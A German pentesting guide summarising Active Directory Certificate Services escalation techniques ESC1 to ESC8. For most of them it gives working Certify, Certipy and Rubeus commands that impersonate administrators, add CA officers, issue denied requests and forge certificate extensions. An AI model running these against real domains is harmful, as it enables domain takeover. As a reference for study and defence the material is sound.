# AD CS-Domäneneskalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Abschnitte zu Eskalationstechniken aus den Beiträgen:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Certificate Templates - ESC1

### Erklärung

### Fehlkonfigurierte Certificate Templates - ESC1 erklärt

- **Die Enterprise CA gewährt Benutzern mit niedrigen Berechtigungen Enrolment-Rechte.**
- **Eine Genehmigung durch den Manager ist nicht erforderlich.**
- **Es sind keine Signaturen von autorisiertem Personal erforderlich.**
- **Die Security Descriptors der Certificate Templates sind zu freizügig konfiguriert, sodass Benutzer mit niedrigen Berechtigungen Enrolment-Rechte erhalten können.**
- **Die Certificate Templates sind so konfiguriert, dass sie EKUs definieren, die Authentication ermöglichen:**
- Erweiterte Key-Usage- (EKU-)Kennungen wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder keine EKU (SubCA) sind enthalten.
- **Die Möglichkeit für Requester, einen subjectAltName in die Certificate Signing Request (CSR) aufzunehmen, ist durch das Template erlaubt:**
- Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat zur Identitätsprüfung, sofern dieser vorhanden ist. Das bedeutet, dass durch die Angabe des SAN in einer CSR ein Zertifikat angefordert werden kann, um einen beliebigen Benutzer (z. B. einen Domain-Administrator) zu impersonifizieren. Ob ein SAN vom Requester angegeben werden kann, wird im AD-Objekt des Certificate Templates durch die Eigenschaft `mspki-certificate-name-flag` festgelegt. Diese Eigenschaft ist eine Bitmaske, und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt dem Requester die Angabe des SAN.

> [!CAUTION]
> Die beschriebene Konfiguration ermöglicht es Benutzern mit niedrigen Berechtigungen, Zertifikate mit einem beliebigen SAN ihrer Wahl anzufordern und sich dadurch über Kerberos oder SChannel als beliebiger Domain-Principal zu authentifizieren.

Diese Funktion ist manchmal aktiviert, um die On-the-fly-Generierung von HTTPS- oder Host-Zertifikaten durch Produkte oder Deployment-Services zu unterstützen, oder aufgrund eines mangelnden Verständnisses.

Es wird darauf hingewiesen, dass das Erstellen eines Zertifikats mit dieser Option eine Warnung auslöst. Dies ist nicht der Fall, wenn ein vorhandenes Certificate Template (z. B. das `WebServer`-Template, bei dem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und anschließend so geändert wird, dass eine Authentication-OID enthalten ist.<sup>[[6]](#references)</sup>

### Ausnutzung

Um **verwundbare Certificate Templates zu finden**, können Sie Folgendes ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um **diese Schwachstelle auszunutzen und sich als Administrator auszugeben**, könnte man Folgendes ausführen:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dann kannst du das generierte **Zertifikat in das `.pfx`**-Format umwandeln und es erneut zur **Authentifizierung mit Rubeus oder certipy** verwenden:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binärdateien "Certreq.exe" und "Certutil.exe" können zum Generieren der PFX verwendet werden: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Enumeration von Zertifikatvorlagen innerhalb des Konfigurationsschemas der AD Forest, insbesondere solcher, die keine Genehmigung oder Signaturen erfordern, über eine Client Authentication- oder Smart Card Logon-EKU verfügen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist, kann durch Ausführen der folgenden LDAP-Abfrage erfolgen:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Certificate Templates – ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Enrollment-Rechte werden von der Enterprise CA an Benutzer mit geringen Berechtigungen vergeben.
2. Die Anforderung einer Manager-Genehmigung ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen wurde weggelassen.
4. Ein zu weit gefasster Security Descriptor auf dem Certificate Template gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte für Zertifikate.
5. **Das Certificate Template ist so definiert, dass es die Any Purpose EKU oder keine EKU enthält.**

Die **Any Purpose EKU** erlaubt es einem Angreifer, ein Zertifikat für **jeden beliebigen Zweck** zu erhalten, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code Signing usw. Dieselbe **für ESC3 verwendete Technik** kann eingesetzt werden, um dieses Szenario auszunutzen.

Zertifikate **ohne EKUs**, die als Subordinate-CA-Zertifikate fungieren, können für **jeden beliebigen Zweck** ausgenutzt werden und **auch zum Signieren neuer Zertifikate verwendet werden**. Daher könnte ein Angreifer durch die Verwendung eines Subordinate-CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten festlegen.

Neue Zertifikate, die für die **Domain-Authentifizierung** erstellt wurden, funktionieren jedoch nicht, wenn die Subordinate CA nicht vom **`NTAuthCertificates`**-Objekt als vertrauenswürdig eingestuft wird, was die Standardeinstellung ist. Dennoch kann ein Angreifer weiterhin **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten potenziell für eine Vielzahl von Zwecken **missbraucht** werden (z. B. Code Signing, Server-Authentifizierung usw.) und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.<sup>[[6]](#references)</sup>

Um Templates zu enumerieren, die diesem Szenario innerhalb des Konfigurationsschemas der AD Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrolment-Agent-Templates - ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, missbraucht jedoch eine **andere EKU** (Certificate Request Agent) und **2 unterschiedliche Templates** (daher gibt es 2 Anforderungssätze).

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, ermöglicht es einem Principal, ein **Zertifikat** **im Namen eines anderen Benutzers zu beantragen**.

Der **„Enrollment Agent“** beantragt ein solches **Template** und verwendet das resultierende **Zertifikat, um eine CSR im Namen des anderen Benutzers mit zu signieren**. Anschließend **sendet** er die **mit signierte CSR** an die CA, um ein **Template** zu beantragen, das **„enroll on behalf of“** erlaubt. Die CA antwortet dann mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.<sup>[[6]](#references)</sup>

**Anforderungen 1:**

- Die Enterprise CA gewährt Benutzern mit niedrigen Berechtigungen Enrolment-Rechte.
- Die Anforderung einer Manager-Genehmigung ist nicht aktiviert.
- Es ist keine Anforderung autorisierter Signaturen vorhanden.
- Der Sicherheitsdeskriptor des Zertifikat-Templates ist übermäßig permissiv und gewährt Benutzern mit niedrigen Berechtigungen Enrolment-Rechte.
- Das Zertifikat-Template enthält die Certificate Request Agent EKU und ermöglicht dadurch die Beantragung anderer Zertifikat-Templates im Namen anderer Principals.

**Anforderungen 2:**

- Die Enterprise CA gewährt Benutzern mit niedrigen Berechtigungen Enrolment-Rechte.
- Die Manager-Genehmigung wird umgangen.
- Die Schema-Version des Templates ist entweder 1 oder höher als 2, und es legt eine Application Policy Issuance Requirement fest, die die Certificate Request Agent EKU voraussetzt.
- Eine im Zertifikat-Template definierte EKU ermöglicht die Domain-Authentifizierung.
- Für Enrollment Agents gelten auf der CA keine Einschränkungen.

### Missbrauch

Du kannst [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die ein **Enrollment-Agent-Zertifikat erhalten** dürfen, die Templates, in denen Enrollment **Agents** enrollen dürfen, und die **Konten**, in deren Namen der Enrollment Agent handeln darf, können durch Enterprise-CAs eingeschränkt werden. Dies wird erreicht, indem das `certsrc.msc`-**Snap-in** geöffnet, auf die **CA rechtsgeklickt**, auf **Properties** geklickt und anschließend zum Tab „Enrollment Agents“ navigiert wird.

Es wird jedoch darauf hingewiesen, dass die **Standardeinstellung** für CAs „**Do not restrict enrollment agents**“ lautet. Wenn Administratoren die Einschränkung von Enrollment Agents aktivieren und sie auf „Restrict enrollment agents“ setzen, bleibt die Standardkonfiguration äußerst permissiv. Sie gewährt **Everyone** Zugriff, sich in allen Templates als beliebige Person zu enrollen.

## Zugriffskontrolle für verwundbare Certificate Templates – ESC4

### **Erklärung**

Der **Security Descriptor** für **Certificate Templates** definiert die spezifischen **Berechtigungen**, die **AD-Principals** in Bezug auf das Template besitzen.

Wenn ein **Angreifer** über die erforderlichen **Berechtigungen** verfügt, ein **Template** zu **ändern** und eine der in den **vorherigen Abschnitten** beschriebenen **ausnutzbaren Fehlkonfigurationen** einzurichten, kann dies eine Privilege Escalation ermöglichen.

Zu den wichtigsten Berechtigungen für Certificate Templates gehören:<sup>[[6]](#references)</sup>

- **Owner:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
- **FullControl:** Ermöglicht vollständige Kontrolle über das Objekt, einschließlich der Möglichkeit, beliebige Attribute zu ändern.
- **WriteOwner:** Ermöglicht die Änderung des Besitzers des Objekts auf einen Principal unter der Kontrolle des Angreifers.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen und kann einem Angreifer FullControl gewähren.
- **WriteProperty:** Ermöglicht die Bearbeitung beliebiger Objekteigenschaften.

### Missbrauch

Um Principals mit Bearbeitungsrechten für Templates und andere PKI-Objekte zu identifizieren, mit Certify enumerieren:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ein Beispiel für einen privesc wie beim vorherigen:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 liegt vor, wenn ein Benutzer Schreibrechte für ein certificate template besitzt. Dies kann beispielsweise dazu missbraucht werden, die Konfiguration des certificate template zu überschreiben und es dadurch für ESC1 verwundbar zu machen.

Wie wir im obigen Pfad sehen können, besitzt nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` verfügt über die neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert. Er ist als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt.<sup>[[8]](#references)</sup> Hier ist ein kleiner Einblick in Certipys Befehl `shadow auto`, mit dem der NT-Hash des Opfers abgerufen werden kann.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. **Standardmäßig** überschreibt Certipy die **Konfiguration**, um sie **anfällig für ESC1** zu machen. Wir können auch den **`-save-old`-Parameter angeben, um die alte Konfiguration zu speichern**, was für die **Wiederherstellung** der Konfiguration nach unserem Angriff nützlich ist.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zugriffskontrolle für verwundbare PKI-Objekte – ESC5

### Erklärung

Das weitreichende Netz miteinander verbundener ACL-basierter Beziehungen, das mehrere Objekte über Zertifikatvorlagen und die Zertifizierungsstelle hinaus umfasst, kann die Sicherheit des gesamten AD CS-Systems beeinflussen. Zu diesen Objekten, die die Sicherheit erheblich beeinträchtigen können, gehören:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes untergeordnete AD-Objekt oder jeder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Certificate Templates-Container, den Certification Authorities-Container, das NTAuthCertificates-Objekt und den Enrollment Services Container.

Die Sicherheit des PKI-Systems kann kompromittiert werden, wenn es einem Angreifer mit niedrigen Berechtigungen gelingt, die Kontrolle über eine dieser kritischen Komponenten zu erlangen.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 – ESC6

### Erklärung

Der im [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Sachverhalt geht ebenfalls auf die Auswirkungen des von Microsoft beschriebenen Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ein. Diese Konfiguration erlaubt bei Aktivierung auf einer Certification Authority (CA) die Aufnahme von **benutzerdefinierten Werten** in den **subject alternative name** für **jede Anfrage**, einschließlich solcher, die aus Active Directory® erstellt werden. Dadurch kann sich ein **Angreifer** über **jede Vorlage** registrieren, die für die Domänenauthentifizierung eingerichtet ist – insbesondere über solche, die die Registrierung durch **nicht privilegierte** Benutzer erlauben, wie die standardmäßige User-Vorlage. Als Ergebnis kann ein Zertifikat erlangt werden, das es dem Angreifer ermöglicht, sich als Domänenadministrator oder als **jede andere aktive Identität** innerhalb der Domäne zu authentifizieren.<sup>[[9]](#references)</sup>

**Hinweis**: Die Methode zum Anhängen von **alternativen Namen** an einen Certificate Signing Request (CSR) über das Argument `-attrib "SAN:"` in `certreq.exe` (bezeichnet als „Name Value Pairs“) unterscheidet sich von der Exploitationsstrategie für SANs in ESC1. Der Unterschied besteht darin, **wie Kontoinformationen eingebettet werden** – in einem Zertifikatattribut statt in einer Erweiterung.

### Ausnutzung

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Dieser Vorgang nutzt im Wesentlichen **remote registry access**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, kann der folgende Befehl von jeder Workstation aus ausgeführt werden, sofern man über **Domänenadministratorrechte** oder gleichwertige Berechtigungen verfügt:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das Flag mit folgendem Befehl entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nach den Sicherheitsupdates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die **`objectSid`-Eigenschaft des Antragstellers** übernimmt. Bei ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** entspricht die SID jedoch der **`objectSid` des Antragstellers** und nicht dem SAN.\
> Um ESC6 auszunutzen, muss das System anfällig für ESC10 (Weak Certificate Mappings) sein, bei dem das **SAN gegenüber der neuen Sicherheitserweiterung priorisiert wird**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Die Zugriffskontrolle für eine certificate authority wird durch eine Reihe von Berechtigungen geregelt, die die Aktionen der CA steuern. Diese Berechtigungen können angezeigt werden, indem auf `certsrv.msc` zugegriffen, mit der rechten Maustaste auf eine CA geklickt, „Properties“ ausgewählt und anschließend zur Registerkarte „Security“ navigiert wird. Zusätzlich können Berechtigungen mithilfe des PSPKI-Moduls und Befehlen wie den folgenden aufgelistet werden:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies bietet Einblicke in die wichtigsten Berechtigungen, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen „CA administrator“ bzw. „Certificate Manager“ entsprechen.<sup>[[6]](#references)</sup>

#### Abuse

**`ManageCA`**-Berechtigungen für eine certificate authority ermöglichen es dem Principal, Einstellungen remote mithilfe von PSPKI zu manipulieren. Dazu gehört das Aktivieren des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe eines SAN in jedem Template zu erlauben – ein kritischer Aspekt der domain escalation.

Dieser Prozess lässt sich mithilfe des PSPKI-Cmdlets **Enable-PolicyModuleFlag** vereinfachen, wodurch Änderungen ohne direkte Interaktion mit der GUI vorgenommen werden können.

**`ManageCertificates`**-Berechtigungen ermöglichen die Genehmigung ausstehender Requests und umgehen damit effektiv die Schutzmaßnahme „CA certificate manager approval“.

Eine Kombination aus den Modulen **Certify** und **PSPKI** kann verwendet werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

> [!WARNING]
> Im **vorherigen Angriff** wurden **`Manage CA`**-Berechtigungen verwendet, um das Flag **EDITF_ATTRIBUTESUBJECTALTNAME2** zu **aktivieren** und den **ESC6-Angriff** durchzuführen. Dies hat jedoch keine Wirkung, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer über das Zugriffsrecht **`Manage CA`** verfügt, darf er den **Dienst neu starten**. Das bedeutet jedoch **nicht, dass der Benutzer den Dienst remote neu starten kann**. Außerdem funktioniert E**SC6 in den meisten gepatchten Umgebungen möglicherweise nicht ohne weitere Maßnahmen**, da die Sicherheitsupdates vom Mai 2022 dies verhindern können.

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

- Nur die Berechtigung **`ManageCA`**
- Berechtigung **`Manage Certificates`** (kann über **`ManageCA`** erteilt werden)
- Das Zertifikattemplate **`SubCA`** muss **aktiviert** sein (kann über **`ManageCA`** aktiviert werden)

Die Technik beruht auf der Tatsache, dass Benutzer mit den Zugriffsrechten `Manage CA` _und_ `Manage Certificates` **fehlgeschlagene Zertifikatanfragen ausstellen** können. Das Zertifikattemplate **`SubCA`** ist für **ESC1** **vulnerable**, aber **nur Administratoren** können sich für das Template registrieren. Daher kann ein **Benutzer** die **Anforderung** stellen, sich für **`SubCA`** zu registrieren – was **abgelehnt** wird –, die anschließend jedoch vom Manager ausgestellt wird.<sup>[[6]](#references)</sup>

#### Missbrauch

Du kannst dir selbst das Zugriffsrecht **`Manage Certificates`** erteilen, indem du deinen Benutzer als neuen Sachbearbeiter hinzufügst.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-Vorlage kann auf der **CA** mit dem Parameter `-enable-template` **aktiviert** werden. Standardmäßig ist die `SubCA`-Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir beginnen, indem wir **ein Zertifikat basierend auf dem `SubCA`-Template anfordern**.

**Diese Anfrage wird abgelehnt**, aber wir speichern den privaten Schlüssel und notieren die Anfrage-ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unseren **`Manage CA` und `Manage Certificates`** können wir anschließend die **fehlgeschlagene Zertifikatanforderung** mit dem `ca`-Befehl und dem Parameter `-issue-request <request ID>` ausstellen.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir das **ausgestellte Zertifikat** mit dem Befehl `req` und dem Parameter `-retrieve <request ID>` **abrufen**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Angriff 3 – Missbrauch der Manage Certificates-Erweiterung (SetExtension)

#### Erklärung

Zusätzlich zu den klassischen ESC7-Missbrauchsmöglichkeiten (Aktivieren von EDITF-Attributen oder Genehmigen ausstehender Anfragen) hat **Certify 2.0** ein völlig neues Primitive eingeführt, das lediglich die Rolle *Manage Certificates* (auch **Certificate Manager / Officer**) auf der Enterprise CA erfordert.<sup>[[3]](#references)</sup>

Die RPC-Methode `ICertAdmin::SetExtension` kann von jedem Principal ausgeführt werden, der *Manage Certificates* besitzt. Während die Methode traditionell von legitimen CAs verwendet wurde, um Erweiterungen ausstehender Anfragen zu aktualisieren, kann ein Angreifer sie missbrauchen, um eine **nicht standardmäßige** Zertifikatserweiterung (beispielsweise eine benutzerdefinierte *Certificate Issuance Policy*-OID wie `1.1.1.1`) an eine auf Genehmigung wartende Anfrage anzuhängen.

Da das Zieltemplate keinen Standardwert für diese Erweiterung definiert, wird die vom Angreifer kontrollierte value von der CA bei der späteren Ausstellung **NICHT** überschrieben. Das resultierende Zertifikat enthält daher eine vom Angreifer gewählte Erweiterung, die:

* Anforderungen an Application / Issuance Policies anderer verwundbarer Templates erfüllen kann (und dadurch zu einer Privilege Escalation führt).
* zusätzliche EKUs oder Policies einschleusen kann, die dem Zertifikat in Drittanbietersystemen unerwartetes Vertrauen gewähren.

Kurz gesagt kann *Manage Certificates* – bisher als die „weniger mächtige“ Hälfte von ESC7 betrachtet – nun für eine vollständige Privilege Escalation oder langfristige Persistence genutzt werden, ohne die CA-Konfiguration anzufassen oder das restriktivere Recht *Manage CA* zu benötigen.

#### Missbrauch des Primitives mit Certify 2.0

1. **Eine Zertifikatanfrage übermitteln, die *pending* bleibt.** Dies kann mit einem Template erzwungen werden, das eine Manager-Genehmigung erfordert:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Eine benutzerdefinierte Erweiterung an die ausstehende Anfrage anhängen**, indem der neue Befehl `manage-ca` verwendet wird:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Wenn das Template die Erweiterung *Certificate Issuance Policies* nicht bereits definiert, bleibt der obige value nach der Ausstellung erhalten.*

3. **Die Anfrage ausstellen** (wenn deine Rolle ebenfalls über Genehmigungsrechte für *Manage Certificates* verfügt) oder warten, bis ein Operator sie genehmigt. Nach der Ausstellung das Zertifikat herunterladen:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Das resultierende Zertifikat enthält nun die schädliche Issuance-Policy-OID und kann für nachfolgende Angriffe verwendet werden (z. B. ESC13, Domain Escalation usw.).

> HINWEIS: Derselbe Angriff kann mit Certipy ≥ 4.7 über den Befehl `ca` und den Parameter `-set-extension` ausgeführt werden.

## NTLM Relay zu AD CS HTTP-Endpunkten – ESC8

### Erklärung

> [!TIP]
> Wenn in Umgebungen **AD CS installiert** ist, ein **verwundbarer Web-Enrollment-Endpunkt** vorhanden ist und mindestens ein **Zertifikattemplate veröffentlicht** wurde, das die Enrollment von Domain-Computern und Client Authentication erlaubt (beispielsweise das Standardtemplate **`Machine`**), kann **jeder Computer mit aktivem Spooler-Service von einem Angreifer kompromittiert werden**!

AD CS unterstützt mehrere **HTTP-basierte Enrollment-Methoden**, die über zusätzliche Serverrollen bereitgestellt werden, die Administratoren installieren können. Diese Schnittstellen für HTTP-basiertes Certificate Enrollment sind anfällig für **NTLM-Relay-Angriffe**. Ein Angreifer kann sich von einer **kompromittierten Maschine aus als jedes AD-Konto ausgeben, das sich über eingehendes NTLM authentifiziert**. Während er das Opferkonto imitiert, kann der Angreifer auf diese Webschnittstellen zugreifen, um mithilfe der Zertifikattemplates `User` oder `Machine` ein Client-Authentication-Zertifikat anzufordern.

- Die **Web-Enrollment-Schnittstelle** (eine ältere ASP-Anwendung, verfügbar unter `http://<caserver>/certsrv/`) verwendet standardmäßig nur HTTP, das keinen Schutz gegen NTLM-Relay-Angriffe bietet. Außerdem erlaubt sie über ihren Authorization-HTTP-Header ausdrücklich nur NTLM-Authentifizierung, wodurch sicherere Authentifizierungsmethoden wie Kerberos nicht anwendbar sind.
- Der **Certificate Enrollment Service** (CES), der **Certificate Enrollment Policy** (CEP) Web Service und der **Network Device Enrollment Service** (NDES) unterstützen standardmäßig Negotiate-Authentifizierung über ihren Authorization-HTTP-Header. Die Negotiate-Authentifizierung **unterstützt sowohl** Kerberos als auch **NTLM**, wodurch ein Angreifer die Authentifizierung während Relay-Angriffen auf **NTLM herabstufen** kann. Obwohl diese Webservices standardmäßig HTTPS aktivieren, bietet HTTPS allein **keinen Schutz gegen NTLM-Relay-Angriffe**. Der Schutz von HTTPS-Services gegen NTLM-Relay-Angriffe ist nur möglich, wenn HTTPS mit Channel Binding kombiniert wird. Bedauerlicherweise aktiviert AD CS die Extended Protection for Authentication in IIS nicht, die für Channel Binding erforderlich ist.<sup>[[6]](#references)</sup>

